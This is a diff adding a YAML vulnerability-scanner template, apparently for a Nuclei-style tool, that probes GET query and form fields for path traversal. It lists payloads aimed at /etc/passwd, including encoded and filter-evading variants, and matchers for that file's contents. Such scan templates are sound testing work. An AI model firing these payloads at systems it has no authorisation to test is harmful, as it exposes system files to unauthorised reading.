@@ -1,0 +1,23 @@
+definition:
+  method:
+  - GET
+  position:
+  - query
+  - form_field
+id: path-traversal
+info:
+  description: 경로 탐색 취약점 스캔
+  name: Path Traversal
+  severity: high
+matchers:
+- type: word
+  words:
+  - 'root:x:'
+  - 'root:0:0:'
+  - /bin/bash
+  - 'nobody:x:'
+matchers-condition: or
+payloads:
+- ../../../../etc/passwd
+- ..%2F..%2F..%2Fetc%2Fpasswd
+- '....//....//....//etc/passwd'
